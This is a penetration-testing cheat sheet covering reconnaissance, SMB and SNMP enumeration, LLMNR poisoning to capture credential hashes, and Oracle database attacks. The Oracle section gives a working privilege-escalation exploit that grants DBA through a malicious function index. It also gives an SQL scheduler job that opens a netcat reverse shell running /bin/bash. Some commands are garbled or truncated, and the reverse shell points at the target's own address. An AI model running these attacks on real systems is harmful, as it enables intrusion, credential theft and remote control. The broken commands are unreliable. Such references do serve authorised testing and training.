# Pen Testing Tools Cheat Sheet


## Table of Contents

* Introduction
* Pre-engagement
  * Network Configuration
    * Set IP Address

            ```
            ifconfig eth0 xxx.xxx.xxx.xxx/24
            ```

    * Subnetting

            ```
            ipcalc xxx.xxx.xxx.xxx/24
            ipcalc xxx.xxx.xxx.xxx 255.255.255.0
            ```

  * OSINT
    * Passive Information Gathering
      * DNS
        * WHOIS enumeration

                    ```
                    whois domain-name-here.com
                    ```

        * Perform DNS IP Lookup

                    ```
                    dig a domain-name-here.com @nameserver
                    ```

        * Perform MX Record Lookup

                    ```
                    dig mx domain-name-here.com @nameserver
                    ```

        * Perform Zone Transfer with DIG

                    ```
                    dig axfr domain-name-here.com @nameserver
                    ```

      * DNS Zone Transfers

                ```
                nslookup -> set type=any -> ls -d blah.com  Windows DNS zone transfer
                dig axfr blah.com @ns1.blah.com  Linux DNS zone transfer
                ```

      * Email
        * Simply Email
                    Use Simply Email to enumerate all the online places (github, target site etc), it works better if you use proxies or set long throttle times so google doesn't think you're a robot and make you fill out a Captcha.

                    ```
                    git clone https://github.com/killswitch-GUI/SimplyEmail.git
                    ./SimplyEmail.py -all -e TARGET-DOMAIN
                    ```

                    Simply Email can verify the discovered email addresss after gathering.
      * Semi Active Information Gathering
        * Basic Finger Printing
                    Manual finger printing / banner grabbing.

                    ```
                    nc -v 192.168.1.1 25  Basic versioning/finger printing via displayed banner
                    telnet 192.168.1.1 25
                    ```

        * Banner grabbing with NC

                    ```
                    nc TARGET-IP 80
                    GET / HTTP/1.1
                    Host: TARGET-IP
                    User-Agent: Mozilla/5.0
                    Referrer: meh-domain

                    ```

      * Active Information Gathering
        * DNS Bruteforce
          * DNSRecon

                        ```
                        root:~# dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml output.xml
                        ```

        * Port Scanning
          * Nmap Commands
                        For more commands, see the Nmap cheat sheet (link in the menu on the right).
                        Basic Nmap Commands:

                        ```
                        nmap -v -sS -A -T4 target  Nmap verbose scan, runs syn stealth, T4 timing (should be ok on LAN), OS and service version info, traceroute and scripts against services
                        nmap -v -sS -p-- -A -T4 target  As above but scans all TCP ports (takes a lot longer)
                        nmap -v -sU -sS -p- -A -T4 target  As above but scans all TCP ports and UDP scan (takes even longer)
                        nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.1.X  Nmap script to scan for vulnerable SMB servers - WARNING: unsafe=1 may cause knockover
                        ls /usr/share/nmap/scripts/* | grep ftp  Search nmap scripts for keywords
                        ```

          * Nmap UDP Scanning

                        ```
                        nmap -sU TARGET
                        ```

          * UDP Protocol Scanner

                        ```
                        git clone https://github.com/portcullislabs/udp-proto-scanner.git
                        ./udp-protocol-scanner.pl -f ip.txt  Scan a file of IP addresses for all services:
                        udp-proto-scanner.pl -p ntp -f ips.txt  Scan for a specific UDP service:
                        ```

        * Other Host Discovery
                    Other methods of host discovery, that don't use nmap...

                    ```
                    netdiscover -r 192.168.1.0/24  Discovers IP, MAC Address and MAC vendor on the subnet from ARP, helpful for confirming you're on the right VLAN at $client site
                    ```

  * Enumeration & Attacking Network Services
    * SAMB / SMB / Windows Domain Enumeration
      * Samba Enumeration
      * SMB Enumeration Tools

                ```
                nmblookup -A target
                smbclient //MOUNT/share -I target -N
                rpcclient -U "" "" target
                enum4linux target
                ```

                Also see, nbtscan cheat sheet (right hand menu).

                ```
                nbtscan 192.168.1.0/24  Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain
                enum4linux -a target-ip  Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing
                ```

      * Fingerprint SMB Version

                ```
                smbclient -L //192.168.1.100
                ```

      * Find open SMB Shares

                ```
                nmap -v -sS -p 445 --script=smb-enum-shares --script-args smbuser=user,smbpass=pass target
                nmap -v -sS -p 445 --script=smb-enum-shares --script-args smbuser=user,smbhash=hash target
                nmap -v -sS -p 445 --script=smb-enum-shares target
                ```

      * Enumerate SMB Users

                ```
                nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200
                python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX
                ```

      * RID Cycling:

                ```
                ridenum.py 192.168.XXX.XXX 500 50000 dict.txt
                ```

                Metasploit module for RID cycling:

                ```
                use auxiliary/scanner/smb/smb_lookupsid
                ```

      * Manual Null session testing:
                Windows:

                ```
                net use \\TARGET\IPC$ "" "/u:""
                ```

                Linux:

                ```
                smbclient -L //192.168.99.131
                ```

      * NBTScan unixwiz
                Install on Kali rolling:

                ```
                apt-get install nbtscan-unixwiz
                nbtscan-unixwiz -f 192.168.0.1-254 > nbtscan
                ```

    * LLMNR / NBT-NS Spoofing
            Steal credentials off the network.
      * Metasploit LLMNR / NetBIOS requests
                Spoof / poison LLMNR / NetBIOS requests:

                ```
                auxiliary/spoof/llmnr/llmnr_response
                auxiliary/spoof/nbns/nbns_response
                ```

                Capture the hashes:

                ```
                auxiliary/server/capture/smb
                auxiliary/server/capture/http_ntlm
                ```

                You'll end up with NTLMv2 hash, use john or hashcat to crack it.
      * Responder.py
                Alternatively you can use responder.

                ```
                git clone https://github.com/SpiderLabs/Responder.git
                python Responder.py -i local-ip -I eth0
                ```

                Run Responder.py for the whole engagement
                Run Responder.py for the length of the engagement while you're working on other attack vectors.
    * SNMP Enumeration Tools
            A number of SNMP enumeration tools.
            Fix SNMP output values so they are human readable:

            ```
            apt-get install snmp-mibs-downloader download-mibs
            echo "" > /etc/snmp/snmp.conf
            ```

            ```
            snmpcheck -t 192.168.1.X -c public  SNMP enumeration
            snmpwalk -c public -v1 192.168.1.X 1 | grep hrSWRunName|cut -d" " -f4
            snmpenum -t 192.168.1.X
            onesixtyone -c names -i hosts
            ```

            SNMPv3 Enumeration Tools
            Idenitfy SNMPv3 servers with nmap:

            ```
            nmap -sV -p 161 --script=snmp-info TARGET-SUBNET
            ```

            Rory McCune's snmpwalk wrapper script helps automate the username enumeration process for SNMPv3:

            ```
            apt-get install snmp snmp-mibs-downloader
            wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb
            ```

            Use Metasploits Wordlist
            Metasploit's wordlist (KALI path below) has common credentials for v1 & 2 of SNMP, for newer credentials check out Daniel Miessler's SecLists project on GitHub (not the mailing list!).

            ```
            /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
            ```

    * R Services Enumeration
            This is legacy, included for completeness.
            nmap -A will perform all the rservices enumeration listed below, this section has been added for completeness or manual confirmation:
      * RSH Enumeration
        * RSH Run Commands

                    ```
                    rsh <target> <command>
                    ```

        * Metasploit RSH Login Scanner

                    ```
                    auxiliary/scanner/rservices/rsh_login
                    ```

        * rusers Show Logged in Users

                    ```
                    rusers -al 192.168.2.1
                    ```

        * rusers scan whole Subnet

                    ```
                    rlogin -l <user> <target>
                    ```

                    e.g rlogin -l root TARGET-SUBNET/24
    * Finger Enumeration

            ```
            finger @TARGET-IP
            ```

            Finger a Specific Username

            ```
            finger batman@TARGET-IP
            ```

            Solaris bug that shows all logged in users:

            ```
            finger @@host
            ```

            SunOS: RPC services allow user enum:

            ```
            rusers # users logged onto LAN
            ```

            ```
            finger 'a b c d e f g h'@sunhost
            ```

            rwho
            Use nmap to identify machines running rwhod (513 UDP)
    * TLS & SSL Testing
      * testssl.sh
                Test all the things on a single host and output to a .html file:

                ```
                ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha >
                ```

    * Vulnerability Assessment
            Install OpenVAS 8 on Kali Rolling:

            ```
            apt-get update
            apt-get dist-upgrade -y
            apt-get install openvas
            openvas-setup
            ```

            Verify openvas is running using:

            ```
            netstat -tulnp
            ```

            Login at <https://127.0.0.1:9392> - credentials are generated during openvas-setup.
    * Database Penetration Testing
            Attacking database servers exposed on the network.
      * Oracle
                Install oscanner:

                ```
                apt-get install oscanner
                ```

                Run oscanner:

                ```
                oscanner -s 192.168.1.200 -P 1521
                ```

                Fingerprint Oracle TNS Version
                Install tnscmd10g:

                ```
                apt-get install tnscmd10g
                ```

                Fingerprint oracle tns:

                ```
                tnscmd10g version -h TARGET
                nmap --script=oracle-tns-version
                ```

                Brute force oracle user accounts
                Identify default Oracle accounts:

                ```
                nmap --script=oracle-sid-brute
                nmap --script=oracle-brute
                ```

                Run nmap scripts against Oracle TNS.

                ```
                nmap -p 1521 -A TARGET
                ```

                Oracle Privilege Escalation
                Requirements:
        * Oracle needs to be exposed on the network
        * A default account is in use like scott
                Quick overview of how this works:
                1. Create the function
                2. Create an index on table SYS.DUAL
                3. The index we just created executes our function SCOTT.GDTDBA('BAR');
                4. The function will be executed by SYS user (as that's the user that owns the table).
                5. Create an account with DBA priveleges
                In the example below the user SCOTT is used but this should be possible with another default Oracle account.
                Identify default accounts within oracle db using NMAP NSE scripts:

                ```
                nmap --script=oracle-sid-brute
                nmap --script=oracle-brute
                ```

                Login using the identified weak account (assuming you find one).
                How to identify the current privilege level for an oracle user:

                ```
                SQL> select * from session_privs;
                ```

                ```
                SQL> CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar curren_user is pragma autonomous_transaction; begin execute immediate 'grant dba to user1 identified by pass1'; commit; return 'FOO'; end;
                ```

                Oracle priv esc and obtain DBA access:
                Run netcat:

                ```
                netcat -nvlp 443 code>
                ```

                ```
                SQL> create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA('BAR'));
                ```

                Run the exploit with a select query:

                ```
                SQL> Select * from session_privs;
                ```

                You should have a DBA user with creds user1 and pass1.
                Verify you have DBA privileges by re-running the first command again.
                Remove the exploit using:

                ```
                drop index exploit_1337;
                ```

                Get Oracle Reverse os-shell:

                ```sql
                BEGIN
                  DBMS_SCHEDULER.CREATE_JOB(
                    job_name        => 'REV_SHELL',
                    job_type        => 'EXECUTABLE',
                    job_action      => '/bin/nc',
                    number_of_arguments => 4,
                    start_date      => SYSTIMESTAMP,
                    enabled         => FALSE,
                    auto_drop       => TRUE
                  );
                  
                  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('REV_SHELL', 1, 'TARGET-IP');
                  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('REV_SHELL', 2, '443');
                  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('REV_SHELL', 3, '-e');
                  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('REV_SHELL', 4, '/bin/bash');
                  
                  DBMS_SCHEDULER.ENABLE('REV_SHELL');
                END;
                /
